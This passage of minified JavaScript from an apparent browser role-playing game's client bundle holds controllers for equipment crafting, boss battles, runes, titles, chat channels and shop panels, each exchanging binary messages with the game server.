i=o.SubRoles.ins().getSubRoleByIndex(t),n=0,s=0;s<c.MasterEquipMaxSlot;s++){var r=i.masterEquipDatas[s];if(r&&0!=r.configID){var l=a.GlobalConfig.MasterSuitEquipConfig[r.configID];l&&l.level>=e&&n++}}return n},e.prototype.canCompose=function(t,e){void 0===e&&(e=!1);var i=!0,n="",o=a.GlobalConfig.MasterSuitEquipBaseConfig.minLevel;if(o&&u.ActorCC.level<=o&&(i=!1,n=gettext("人物等级需大于{0}级",o)),i)for(var s=a.GlobalConfig.MasterSuitEquipConfig[t],l=0,h=s.cost;l<h.length;l++){var d=h[l],c=0;if(c=0==d.type?u.ActorCC.getCurrencyByType(d.id):r.BagCT.ins().getBagItemCount(r.BagCT.BAG_TYPE_OTHTER,d.id),0!=d.type&&c<d.count){i=!1,n=gettext("材料不足");break}}return!i&&e&&p.TipsCT.ins().showTips(n),i},__decorate([post()],e.prototype,"postMasterEquipComResult",null),__decorate([post()],e.prototype,"postMasterEquipDeComResult",null),__decorate([post()],e.prototype,"postMasterEquipPm",null),__decorate([post()],e.prototype,"postMasterEquipChange",null),e}(n.BaseSystem);e.MasterEquipCT=d,window.MasterEquipCT=d,__reflect(d.prototype,"MasterEquipCT",[]);var c;!function(t){t[t.MasterEquipMaxSlot=4]="MasterEquipMaxSlot"}(c=e.MasterEquipEnum||(e.MasterEquipEnum={})),window.MasterEquipEnum=c,Systemap.MasterEquipCT=function(){return d.ins()},window.MasterEquipCT=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameclubCT=void 0;var n=i(14),o=i(0),s=function(t){function e(){var e=t.call(this)||this;return e.loggedDays=0,e.isSignInAward=0,e.isTaskAward=0,e.isFirstAward=0,e.sysId=PackageID.pfActivity,e.regNetMsg(28,e.setReturnGameclubInfo),e.regNetMsg(29,e.returnAwardView),e.regNetMsg(30,e.returnSignInData),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendReturnGameclubInfo=function(){var t=this.getBytes(28);this.sendToServer(t)},e.prototype.setReturnGameclubInfo=function(t){this.loggedDays=t.readUnsignedInt(),this.isSignInAward=t.readUnsignedInt(),this.isTaskAward=t.readUnsignedInt(),this.isFirstAward=t.readByte(),this.postGameclubInfo()},e.prototype.postGameclubInfo=function(){},e.prototype.sendGameclubAward=function(t,e){var i=this.getBytes(29);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.returnAwardView=function(t){},e.prototype.sendGameclubSignInInfo=function(){var t=this.getBytes(30);this.sendToServer(t)},e.prototype.returnSignInData=function(t){},e.prototype.returnIsGo=function(t,e){var i=!1;switch(t){case 1:urlParam.ThumbsupCount&&(i=e<=urlParam.ThumbsupCount);break;case 2:urlParam.CommentsCount&&(i=e<=urlParam.CommentsCount);break;case 3:urlParam.MakeAPostCount&&(i=e<=urlParam.MakeAPostCount);break;case 4:urlParam.MakeATVCount&&(i=e<=urlParam.MakeATVCount);break;case 5:urlParam.LikeTheOffPostCount&&(i=e<=urlParam.LikeTheOffPostCount);break;case 6:urlParam.CommentsOffCount&&(i=e<=urlParam.CommentsOffCount)}return i},e.prototype.sendSignInData=function(){var t=o.GlobalConfig.GameClubSignInConfig[1].tasknid,i=!1;for(var n in t)if(e.ins().returnIsGo(t[n].id,t[n].count)){i=!0;break}i&&this.sendGameclubSignInInfo(),e.ins().sendReturnGameclubInfo()},e.prototype.returnSignInRed=function(){var t=o.GlobalConfig.GameClubSignInConfig;if(t)for(var i in t){var n=(e.ins().isSignInAward>>t[i].id-1&1)<=0,s=!0;if(n){var a=t[i].tasknid;for(var r in a)e.ins().returnIsGo(a[r].id,a[r].count)||(s=!1);if(e.ins().loggedDays>=t[i].day&&s)return!0}}return!1},e.prototype.returnTaskRed=function(){var t=o.GlobalConfig.GameClubTaskConfig;if(t)for(var i in t){var n=(e.ins().isTaskAward>>t[i].id-1&1)<=0;if(n&&e.ins().returnIsGo(t[i].type,t[i].param))return!0}return!1},e.prototype.returnFirstRed=function(){return 1!=this.isFirstAward&&(urlParam.ThumbsupCount>=2||urlParam.LikeTheOffPostCount>=2)},__decorate([post()],e.prototype,"postGameclubInfo",null),e}(n.BaseSystem);e.GameclubCT=s,window.GameclubCT=s,__reflect(s.prototype,"GameclubCT",[]),Systemap.GameclubCT=function(){return s.ins()},window.GameclubCT=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TagChanneID=e.ChatInfoData=void 0;var n=i(205),o=function(t){function e(e){void 0===e&&(e=null);var i=t.call(this)||this;return i.type=0,i.id=0,i.servId=0,i.name="",i.job=0,i.sex=0,i.vip=0,i.monthCard=0,i.ladderLevel=0,i.pointId=0,i.str="",i.isFirst=0,i.zsLevel=0,i.lv=0,i.guild="",i.times=0,i.titleId=0,i.fpVipInfo={},i.showIdArr=[],e&&(i.type=e.readByte(),i.id=e.readInt(),i.servId=e.readInt(),i.name=e.readString(),i.job=e.readByte(),i.sex=e.readByte(),i.vip=e.readByte(),i.monthCard=e.readByte(),i.ladderLevel=e.readByte(),i.isFirst=e.readByte(),i.zsLevel=e.readUnsignedByte(),i.lv=e.readShort(),i.guild=e.readString(),i.times=e.readUnsignedInt(),i.pointId=e.readUnsignedInt(),i.str=e.readString(),i.cd=0),i}return __extends(e,t),e.prototype.setShowId=function(){if(-1!=this.str.indexOf("$H")&&-1!=this.str.indexOf("$|")){var t=this.str.slice(this.str.indexOf("$H")+2,this.str.indexOf("$|"));this.showIdArr.push(Number(t)),this.str=this.str.slice(0,this.str.indexOf("$H"))+this.str.slice(this.str.indexOf("$|")+1),this.setShowId()}},e}(n.ChatDataBase);e.ChatInfoData=o,window.ChatInfoData=o,__reflect(o.prototype,"ChatInfoData",[]);var s;!function(t){t[t.ciChannelSecret=0]="ciChannelSecret",t[t.ciChannelNear=1]="ciChannelNear",t[t.ciChannelWorld=2]="ciChannelWorld",t[t.ciChannelGuild=3]="ciChannelGuild",t[t.ciChannelTeam=4]="ciChannelTeam",t[t.ciChannelBigTeam=5]="ciChannelBigTeam",t[t.ciChannelMap=6]="ciChannelMap",t[t.ciChannelAll=7]="ciChannelAll",t[t.ciChannelCamp=8]="ciChannelCamp",t[t.ciChannelSystem=9]="ciChannelSystem",t[t.ciChannelKuafuOld=10]="ciChannelKuafuOld",t[t.ciChannelSos=11]="ciChannelSos",t[t.ciChannelCosign=12]="ciChannelCosign",t[t.ciChannelKuaFu=13]="ciChannelKuaFu",t[t.ciChannelMax=14]="ciChannelMax"}(s=e.TagChanneID||(e.TagChanneID={})),window.TagChanneID=s,window.ChatInfoData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LhCT=void 0;var n=i(14),o=i(0),s=i(6),a=function(t){function e(){var e=t.call(this)||this;return e.lv=-1,e.TimesOut=0,e.wish=0,e.nowExp=0,e.historyArr=[],e.callFalse=!1,e.sysId=PackageID.Samsara,e.regNetMsg(5,e.postLhData),e.regNetMsg(6,e.postLhHistoryData),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postLhData=function(t){this.lv=t.readUnsignedShort(),this.nowExp=t.readDouble(),this.TimesOut=t.readInt(),this.wish=t.readUnsignedShort(),this.updateInfo()},e.prototype.updateInfo=function(){},e.prototype.sendLhUp=function(t){if(!this.callFalse){var e=this.getBytes(5);e.writeByte(t),this.sendToServer(e),this.callFalse=!0,this.setCallFalse()}},e.prototype.setCallFalse=function(){this.callFalse=!1},e.prototype.sendLhHistoryData=function(){var t=this.getBytes(6);this.sendToServer(t)},e.prototype.postLhHistoryData=function(t){this.historyArr=[];for(var e=t.readUnsignedByte(),i=0,n=0;e>n;n++){var o=t.readByte(),s=t.readUnsignedShort(),a=t.readByte(),r=void 0,l=void 0,h=void 0,u=void 0,p=0,d=0,c=0,f=[];switch(a){case 1:break;case 2:d=t.readShort();break;case 3:break;case 4:p=t.readByte();for(var g=0;p>g;g++){r=t.readByte(),l=t.readInt(),h=t.readInt(),u=t.readByte();var m={type:r,itemId:l,count:h,quality:u};f.push(m)}break;case 5:i!=s&&(c=i,i=s),c=t.readUnsignedShort()}var v={result:o,lv:s,type:a,len:p,prisent:d,orDownLv:c,item:f};this.historyArr.push(v)}this.HistoryUpdate()},e.prototype.HistoryUpdate=function(){},e.prototype.sendLhTool=function(t){var e=this.getBytes(7);e.writeInt(t),this.sendToServer(e)},e.prototype.returnRP=function(){var t=o.GlobalConfig.SamsaraItemConfig;if(t)for(var e in t){var i=s.BagCT.ins().getBagGoodsCountById(s.BagCT.BAG_TYPE_OTHTER,t[e].id)||0;if(i>0)return!0}return!1},__decorate([post()],e.prototype,"updateInfo",null),__decorate([delayCall(1e3)],e.prototype,"setCallFalse",null),__decorate([post()],e.prototype,"HistoryUpdate",null),e}(n.BaseSystem);e.LhCT=a,window.LhCT=a,__reflect(a.prototype,"LhCT",[]),Systemap.LhCT=function(){return a.ins()},window.LhCT=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EntityAction=void 0;var n;!function(t){t.ATTACK="a",t.CAST="c",t.STAND="s",t.RUN="r",t.DIE="d"}(n=e.EntityAction||(e.EntityAction={})),window.EntityAction=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShenFuCT=void 0;var n=i(14),o=i(17),s=i(0),a=i(13),r=i(6),l=function(t){function e(){var e=t.call(this)||this;return e.upRed=new o.RedPoint,e.sysId=PackageID.ShenFu,e.regNetMsg(1,e.doUpdateLv),observe(e,e.initRed,a.SubRoles.ins().doSubRole),e
}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){this.sendShenFuInfo()},e.prototype.doUpdateLv=function(t){this.shenFulv=t.readInt()},e.prototype.initRed=function(){var t=this;this.upRed=new o.RedPoint(function(){var e=t.getShenFuLv();if(!e)return!1;var i=s.GlobalConfig.TalismanConfig[e],n=s.GlobalConfig.TalismanConfig[e+1],o=(null===i||void 0===i?void 0:i.cost)||[];if(!o||!n)return!1;for(var a=0;a<o.length;a++)if(r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,o[a].id)<o[a].count)return!1;return!0},e.ins().doUpdateLv,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemChange)},e.prototype.sendShenFuInfo=function(){var t=this.getBytes(1);this.sendToServer(t)},e.prototype.sendShenFuUp=function(){var t=this.getBytes(2);this.sendToServer(t)},e.prototype.getShenFuLv=function(){return this.shenFulv},__decorate([post()],e.prototype,"doUpdateLv",null),e}(n.BaseSystem);e.ShenFuCT=l,window.ShenFuCT=l,__reflect(l.prototype,"ShenFuCT",[]),Systemap.ShenFuCT=function(){return l.ins()},window.ShenFuCT=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AdType=void 0;var n;!function(t){t[t.TYPE_0=0]="TYPE_0",t[t.Relive=1]="Relive",t[t.ExpGold=2]="ExpGold",t[t.BagExpand=3]="BagExpand",t[t.QianDao=4]="QianDao",t[t.offLine=5]="offLine",t[t.HuiShou=6]="HuiShou",t[t.BlackSmith=7]="BlackSmith"}(n=e.AdType||(e.AdType={})),window.AdType=n,window.AdType=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DevildomSys=void 0;var n=i(8),o=i(14),s=i(37),a=i(0),r=i(20),l=i(30),h=i(162),u=i(32),p=i(7),d=i(2),c=function(t){function e(){var e=t.call(this)||this;return e.killedState=[],e.refTime=[],e.openTime=0,e.bossTime=0,e.isInit=!1,e.TimesAt=!1,e.sysId=PackageID.Devildom,e.regNetMsg(1,e.postBossInfo),e.regNetMsg(2,e.postAscriptionChange),e.regNetMsg(5,e.postSendEnter),e.regNetMsg(7,e.doResult),e.regNetMsg(8,e.postInfo),e.regNetMsg(9,e.postHudun),observe(e,function(){e.isDevildomBattle?e.postEnterFb():e.lastDevildom&&e.postQuiKFb()},Ts.enterScene.enterOK),observe(e,function(){e.isDevildomBattle&&win.open("BossBelongPanel")},h.BossCT.ins().postBossAppear),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},Object.defineProperty(e.prototype,"isDevildomBattle",{get:function(){return r.GameMap.fbType==u.FbCT.FB_TYPE_DEVILDOM_BOSS},enumerable:!1,configurable:!0}),e.prototype.isDevildomBOss=function(t){var e=a.GlobalConfig.DevilBossConfig;if(r.GameMap.fbType!=u.FbCT.FB_TYPE_DEVILDOM_BOSS)return!1;for(var i in e){var n=e[i].openBossList;for(var o in n)if(n[o]==t)return 1==e[i].isBoss}return!1},e.prototype.postBossInfo=function(t){var e=t.readShort();this.killedState=[];for(var i=[],n=0;e>n;n++){var o=t.readShort(),s=t.readInt(),a=t.readBoolean();this.killedState[o]=a;var r=t.readByte(),l=t.readString(),h=t.readString();r?(this.guildName=l,this.killer=h,this.bossId=o,this.bossIsKill=a):i[o]=s}this.historyId&&this.refTime[this.historyId]&&i[this.historyId]!=this.refTime[this.historyId]&&(this.historyId=0),this.refTime=i.concat(),this.bossState=t.readByte(),this.openTime=t.readInt(),this.bossTime=t.readShort(),Timer.has(this.setRepeat,this)||Timer.start(1e3,this.openTime+1,this.setRepeat,this),this.bossTime>0&&Timer.start(1e3,this.bossTime+1,this.isTimeGo,this)},e.prototype.setRepeat=function(){var t;this.openTime--,this.openTime<=(null===(t=a.GlobalConfig.DevilBossBase)||void 0===t?void 0:t.countdown)&&this.openTime>=0&&this.postShowIcon()},e.prototype.isTimeGo=function(){this.bossTime--,this.bossTime<=0&&(Timer.stop(this.isTimeGo,this),this.bossTime=0)},e.prototype.postShowIcon=function(){this.isInit?this.isInit&&this.openTime<1&&(this.isInit=!1):this.isInit=!0},e.prototype.postAscriptionChange=function(t){var e=t.readDouble(),i=t.readDouble(),n="";if(e>0){var o=s.EntityManager.ins().getMasterList(e);o&&o[0]&&o[0].infoModel&&(n=o[0].infoModel.name)}h.BossCT.ins().postBelongChange(i,e,n)},e.prototype.doResult=function(t){for(var e=t.readString(),i=t.readString(),n=t.readDouble(),o=t.readBoolean(),s=t.readShort(),r=[],h=0;s>h;h++){var u=new l.RewardData;u.type=t.readInt(),u.id=t.readInt(),u.count=t.readInt(),r.push(u)}s=t.readShort();for(var p=[],h=0;s>h;h++){var d=t.readInt();p.push(l.RewardData.objectToRewardData(a.GlobalConfig.AuctionItem[d].item))}i&&""!=i&&(e="|C:0x2eb6ff&T:【"+i+"】|\n"+e),win.open("DevildomResultWin",n,e,o,p,r)},e.prototype.postInfo=function(t){var e=t.readShort();a.GlobalConfig.DevilBossConfig&&a.GlobalConfig.DevilBossConfig[e]&&!a.GlobalConfig.DevilBossConfig[e].isBoss&&(this.historyId=e);var i=t.readShort();this.enterCD=1e3*i+egret.getTimer()},e.prototype.postHudun=function(t){t&&(this.hudun=t.readShort(),this.hudunMax=t.readShort()),this.hudun>0&&(this.hudun--,Timer.start(1e3,1,this.postHudun,this))},e.prototype.sendClearReliveCD=function(){this.sendBaseProto(3)},e.prototype.sendCleanBelong=function(){this.sendBaseProto(4)},e.prototype.sendEnter=function(t){if(!this.TimesAt){this.TimesAt=!0,this.lastDevildom=!0;var e=this.getBytes(5);e.writeInt(t),this.sendToServer(e),Timer.start(2e3,1,this.setFalse,this)}},e.prototype.setFalse=function(){this.TimesAt=!1},e.prototype.postSendEnter=function(t){var e=t.readByte();1==e&&d.TipsCT.ins().showTips(gettext("今天已击杀过boss"))},e.prototype.postEnterFb=function(){},e.prototype.postQuiKFb=function(){win.close("BossBelongPanel")},e.prototype.isOpen=function(){return!1},e.prototype.isHfTerm=function(){var t=n.DateUtils.formatMiniDateTime(p.GameServerCC._serverHeZeroTime)+a.GlobalConfig.DevilBossBase.hefuTimeLimit*n.DateUtils.MS_PER_DAY;return p.GameServerCC.serverTime-t>0},e.prototype.isInDevilZoneSvr=function(){var t=a.GlobalConfig.RoleBaseConfig.devilZoneSvr;if(!t||!t.length||!t[0])return!1;var e=p.GameServerCC.serverID;return t.some(function(t){var i=t[0],n=t[1];return e>=i&&n>=e})},__decorate([post()],e.prototype,"postBossInfo",null),__decorate([post()],e.prototype,"isTimeGo",null),__decorate([post()],e.prototype,"postShowIcon",null),__decorate([post()],e.prototype,"postAscriptionChange",null),__decorate([post()],e.prototype,"postInfo",null),__decorate([post()],e.prototype,"postHudun",null),__decorate([post()],e.prototype,"postSendEnter",null),__decorate([post()],e.prototype,"postEnterFb",null),__decorate([post()],e.prototype,"postQuiKFb",null),e}(o.BaseSystem);e.DevildomSys=c,window.DevildomSys=c,__reflect(c.prototype,"DevildomSys",[]),Systemap.DevildomSys=function(){return c.ins()},window.DevildomSys=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExtremeEquipCC=e.extremeEquipCC=void 0;var n=i(24),o=i(0),s=i(13),a=i(6),r=i(10),l=i(62),h=i(65),u=i(158),p=i(101),d=i(2),c=i(26),f=i(34),g=function(t){function i(){return null!==t&&t.apply(this,arguments)||this}return __extends(i,t),Object.defineProperty(i.prototype,"descNames",{get:function(){return[gettext("霸业神刀"),gettext("霸业头盔"),gettext("霸业神甲"),gettext("霸业项链"),gettext("霸业手镯"),gettext("霸业手镯2"),gettext("霸业戒指"),gettext("霸业戒指2"),gettext("霸业腰带"),gettext("霸业鞋子")]},enumerable:!1,configurable:!0}),Object.defineProperty(i.prototype,"positions",{get:function(){return[l.EquipPos.WEAPON,l.EquipPos.HEAD,l.EquipPos.CLOTHES,l.EquipPos.NECKLACE,l.EquipPos.Wrist,l.EquipPos.BRACELET,l.EquipPos.RING,l.EquipPos.SHOE,l.EquipPos.DZI,l.EquipPos.HAT]},enumerable:!1,configurable:!0}),i.prototype.getZhiZunLv=function(t,e){void 0===e&&(e=null);var i=e||s.SubRoles.ins().getSubRoleByIndex(0),n=i.getEquipByIndex(t),o=n.item.configID;return o?n.soulLv:0},i.prototype.getZhiZunLvByRoleID=function(t,e){if(!t||e>l.EquipPos.HAT)return 0;var i=t.getEquipByIndex(e),n=i.item.configID;return n?i.soulLv:0},i.prototype.isWear=function(t,e){var i=s.SubRoles.ins().getSubRoleByJob(t),n=i.getEquipByIndex(e),o=n.item.configID;return o?!0:!1},i.prototype.canOperate=function(t,e){void 0===e&&(e=null);var i=e||s.SubRoles.ins().getSubRoleByIndex(0),n=i.getEquipByIndex(t),l=n.item.configID;if(l){var h=n.soulLv;if(h<this.getMaxZhiZunEquipLevel(r.ItemUtil.getSubType(n.item.itemConfig))){var u=o.GlobalConfig.ZhiZunEquipLevel[t][h+1],p=u.materialInfo.count,d=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,u.materialInfo.id);return d>=p}}return!1},i.prototype.getMaxZhiZunEquipLevel=function(t){return n.CommonUtils.getObjectLength(o.GlobalConfig.ZhiZunEquipLevel[t])},i.prototype.getZhiZunSkills=function(t){for(var e=[l.EquipPos.WEAPON,l.EquipPos.CLOTHES],i=[],n=0,s=e;n<s.length;n++){var a=s[n],r=t.getEquipByIndex(a);if(r.item.configID){var h=r.soulLv;if(h>0){var p=o.GlobalConfig.ZhiZunEquipLevel[a][h];p.skillId&&i.push(new u.SkillData(p.skillId))}}}return i},i.prototype.getZhiZunSkill=function(t,e){var i=s.SubRoles.ins().getSubRoleByJob(t),n=i.getEquipByIndex(e),a=n.item.configID;if(a){var r=n.soulLv;if(r>0){var l=o.GlobalConfig.ZhiZunEquipLevel[e][r];return l.skillId}}return 0},i.prototype.getZhiZunLinkLv=function(t,e,i){var n=this.getLinkEquipPos(e),o=t.getEquipByIndex(e),s=t.getEquipByIndex(n);return o&&s?Math.min(i,s.soulLv):0},i.prototype.getZhiZunLinkLvShow=function(t,e,i){var n=s.SubRoles.ins().getSubRoleByIndex(t),a=n.getEquipByIndex(e);if(a&&i){var r=o.GlobalConfig.ZhiZunEquipLevel[e][i];return r.soulLinkLevel}return 1},i.prototype.getLinkEquipPos=function(t){for(var e in o.GlobalConfig.ZhiZunLinkLevel)if(e==t.toString())for(var i in o.GlobalConfig.ZhiZunLinkLevel[e])return+i;return null},i.prototype.getZhiZunLinkLevelConfig=function(t,e){var i=t,n=this.getZhiZunLv(i);n||(n=1);var s=this.getLinkEquipPos(i);e&&(n+=1);var a=o.GlobalConfig.ZhiZunLinkLevel[i][s][n];return a},i.prototype.getZhiZunEquipLevelConfig=function(t,e,i){var n=t,s=e;s||(s=1),i&&(s+=1);var a=o.GlobalConfig.ZhiZunEquipLevel[n][s];return a},i.prototype.getSkillName=function(t){var e=o.GlobalConfig.ZhiZunEquipLevel[t][1];if(!e)return"";var i=o.GlobalConfig.SkillsConfig[e.skillId];return i?h.SkillUtil.getName(i):""},i.prototype.getSkillDesc=function(t){var e=o.GlobalConfig.ZhiZunEquipLevel[t][1];if(!e)return"";var i=o.GlobalConfig.SkillsConfig[e.skillId];return i?h.SkillUtil.getDesc(i):""},i.prototype.getCurCount=function(t){void 0===t&&(t=null);var i=t||s.SubRoles.ins().getSubRoleByIndex(0),n=0,o=e.ExtremeEquipCC.positions.length;if(i)for(var a=0;o>a;a++){var r=0,l=i.getEquipByIndex(e.ExtremeEquipCC.positions[a]),h=l.item.configID;h&&(r=l.soulLv),r>0&&n++}else for(var a=0;o>a;a++)e.ExtremeEquipCC.getZhiZunLv(e.ExtremeEquipCC.positions[a])>0&&n++;return n},i.prototype.setBasicsDesc=function(t){for(var e=o.GlobalConfig.ZhiZunEquipLevel[t][1],i=[],n=0;n<e.attrs.length;n++){var s=e.attrs[n];s.type<=f.AttributeType.atCurseCd&&s.type>=f.AttributeType.atVamirePro||i.push({type:s.type,value:s.value})}return i},i.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e=o.GlobalConfig.ZhiZunSuitSkillConf,i="";return c.ZsCT.ins().stage<e.openLv&&(i=gettext("霸业装备功能{0}转开启",e.openLv)),t&&""!=i&&d.TipsCT.ins().showTips(i),""==i},i}(p.CC);e.extremeEquipCC=g,window.extremeEquipCC=g,__reflect(g.prototype,"extremeEquipCC",[]),e.ExtremeEquipCC=new g,window.ExtremeEquipCC=e.ExtremeEquipCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneCC=void 0;var n=i(14),o=i(10),s=i(150),a=i(2),r=i(12),l=i(15),h=i(54),u=i(6),p=i(0),d=function(t){function i(){var e=t.call(this)||this;return e.UNGET=0,e.CANGET=1,e.ISNGET=2,e.BoxSum=5,e.unlockInfo=[],e.assistantComposeEquip=[],e.runePower=[],e.sysId=PackageID.Rune,e.regNetMsg(8,e.postRuneBoxGift),e.regNetMsg(9,e.postRuneCompose),e.regNetMsg(10,e.postDelRune),e.regNetMsg(12,e.postRuneMinNum),e.boxs=[],observe(e,e.equipResult,Ts.equipRune),observe(e,e.doUpgrade,Ts.upgradeRune),observe(e,e.checkUnLock,h.Fb2CT.ins().postUpDataInfo),e}return __extends(i,t),i.prototype.checkUnLock=function(){for(var t=0;8>t;t++){var e=s.RuneDataMgr.ins().getRuneStateByPos(t);e&&-1==this.unlockInfo.indexOf(t)&&(this.unlockInfo.push(t),this.postUnlock(t))}},i.prototype.getBagRune=function(){return u.BagCT.ins().getItemByItemDescConfig(u.BagCT.BAG_TYPE_OTHTER,6,-1)},i.prototype.equipResult=function(t){var e=(t.result,t.power),i=t.roleID,n=t.pos,o=t.id;return s.RuneDataMgr.ins().replaceRune(i,n,o),this.runePower[i]=e,t},i.prototype.doUpgrade=function(t){var e=t.result,i=t.roleID,n=t.pos,o=t.id;e?(a.TipsCT.ins().showTips(gettext("升级战纹成功")),s.RuneDataMgr.ins().replaceRune(i,n,o)):a.TipsCT.ins().showTips(gettext("升级战纹失败"))},i.prototype.sendUnlock=function(t,e){var i=this.getBytes(8);i.writeShort(t),i.writeShort(e),this.sendToServer(i)},i.prototype.sendRuneMerge=function(){var t=this.getBytes(9);t.writeInt(this.centerComposeEquip.configID),t.writeInt(this.mainComposeEquip.configID),t.writeInt(this.assistantComposeEquip[0].configID),t.writeInt(this.assistantComposeEquip[1].configID),this.sendToServer(t)},i.prototype.sendRuneMinNum=function(t){var e=this.getBytes(12);e.writeInt(t),this.sendToServer(e)},i.prototype.postDelRune=function(t){var e=s.RuneDataMgr.ins().getRune(t.readInt(),t.readInt());e.init()},i.prototype.postRuneMinNum=function(t){var e=t.readUnsignedByte();this.runeMinNum=e},i.prototype.postUnlock=function(t){return t},i.prototype.isHas=function(t,e){void 0===e&&(e=0);for(var i=s.RuneDataMgr.ins().getRoleRune(e),n=0,a=i;n<a.length;n++){var r=a[n];if(o.ItemUtil.getSubType(r.itemConfig)==o.ItemUtil.getSubType(t.itemConfig))return!0}return!1},i.prototype.checkOpen=function(t){void 0===t&&(t=!1);var e=r.OpenSystem.ins().checkSysOpen(l.SystemType.Rune);return t&&!e&&a.TipsCT.ins().showTips(r.OpenSystem.ins().getNoOpenTips(l.SystemType.Rune)),e},i.prototype.postRuneBoxGift=function(t){this.RuneRewards=t.readInt(),this.runeCount=t.readInt(),this.hope=t.readInt();var i=0;for(var n in p.GlobalConfig.FuwenTreasureRewardConfig){var o=p.GlobalConfig.FuwenTreasureRewardConfig[n];this.boxs[i]=this.RuneRewards>>o.id&1?e.RuneCC.ISNGET:this.runeCount>=o.needTime?e.RuneCC.CANGET:e.RuneCC.UNGET,i++}},i.prototype.postRuneCompose=function(t){var e=t.readByte();return e},i.prototype.getIsGetBox=function(){for(var t=0;t<e.RuneCC.BoxSum;t++)switch(e.RuneCC.boxs[t]){case e.RuneCC.UNGET:break;case e.RuneCC.CANGET:return!0;case e.RuneCC.ISNGET:}return!1},i.prototype.synthesisSelect=function(t){return t},__decorate([post()],i.prototype,"equipResult",null),__decorate([post()],i.prototype,"postDelRune",null),__decorate([post()],i.prototype,"postRuneMinNum",null),__decorate([post()],i.prototype,"postUnlock",null),__decorate([post()],i.prototype,"postRuneBoxGift",null),__decorate([post()],i.prototype,"postRuneCompose",null),__decorate([post()],i.prototype,"synthesisSelect",null),i}(n.BaseSystem);window.runecc=d,__reflect(d.prototype,"runecc",[]),e.RuneCC=new d,window.RuneCC=e.RuneCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TitleType=e.Title=void 0;var n=i(14),o=i(0),s=i(13),a=function(t){function e(){var e=t.call(this)||this;return e.timeDict={},e.sysId=PackageID.Title,e.regNetMsg(1,e.postListUpdate),e.regNetMsg(2,e.doAdd),e.regNetMsg(3,e.doRemove),e.regNetMsg(4,e.updateTitle),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postUseTitle=function(t){return t},e.prototype.sendGetList=function(){this.sendBaseProto(1)},e.prototype.postListUpdate=function(t){for(var e=t.readInt(),i=0;e>i;++i)this.timeDict[t.readInt()]=t.readUnsignedInt()},e.prototype.doAdd=function(t){this.change(t.readInt(),t.readUnsignedInt())},e.prototype.doRemove=function(t){this.change(t.readInt(),-1)},e.prototype.sendChangeShow=function(t,e){var i=this.getBytes(4);i.writeShort(0),i.writeInt(t),i.writeByte(e),this.sendToServer(i)},e.prototype.updateTitle=function(t){var e=(t.readDouble(),t.readInt()),i=t.readByte(),n=s.SubRoles.ins().getSubRoleByIndex(0);switch(i){case r.Title:this.curTitle=e,n.titleID=e+"";break;case r.Outward:n.outward=e;break;case r.Head:n.head=e}this.postUpdateOutward()},e.prototype.postUpdateOutward=function(){},e.prototype.change=function(t,e){0>e?this.timeDict[t]&&delete this.timeDict[t]:this.timeDict[t]=e,this.postUpdateOutward()},e.getTitleCfgByItemId=function(t){for(var e in o.GlobalConfig.TitleConf)if(o.GlobalConfig.TitleConf[e].activeItemId==t)return o.GlobalConfig.TitleConf[e];return null},e.TITLE_WIN_REFLASH_PANEL="TITLE_WIN_REFLASH_PANEL",__decorate([post()],e.prototype,"postUseTitle",null),__decorate([post()],e.prototype,"postListUpdate",null),__decorate([post()],e.prototype,"postUpdateOutward",null),e}(n.BaseSystem);e.Title=a,window.Title=a,__reflect(a.prototype,"Title",[]);var r;!function(t){t[t.Default=0]="Default",t[t.Title=1]="Title",t[t.Outward=2]="Outward",t[t.Head=3]="Head"}(r=e.TitleType||(e.TitleType={})),window.TitleType=r,window.TitleType=r,Systemap.Title=function(){return a.ins()},window.Title=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BuyPeakMarketShopPanel=e.BuyGuildPanel=e.BuyItemLoopPanel=e.BuyItemPanel=e.BuyItem2Panel=e.BuyItemBasePanel=void 0;var n=i(1),o=i(24),s=i(4),a=i(52),r=i(2),l=i(0),h=i(31),u=i(10),p=i(5),d=i(18),c=i(25),f=i(30),g=i(19),m=i(6),v=i(216),y=i(28),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="buyitemskin",e.num=1,e.maxNum=0,e.shopID=0,e}return __extends(e,t),e.prototype.skinComplete=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.add1Btn,this.onTap),this.addTouchEvent(this.add10Btn,this.onTap),this.addTouchEvent(this.sub1Btn,this.onTap),this.addTouchEvent(this.sub10Btn,this.onTap),this.addTouchEvent(this.eBuy,this.buy)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.sub10Btn:this.num-=10;break;case this.sub1Btn:this.num-=1;break;case this.add10Btn:this.num+=10;break;case this.add1Btn:this.num+=1}this.num<1&&(this.num=1),this.num>this.maxNum&&(this.num=this.maxNum),this.numLabel.text=this.num+"",this.inputOver()},e.prototype.inputOver=function(){},e.prototype.buy=function(){},e}(n.BaseView);e.BuyItemBasePanel=C,window.BuyItemBasePanel=C,__reflect(C.prototype,"BuyItemBasePanel",[]),window.BuyItemBasePanel=C;var T=function(t){function e(){return 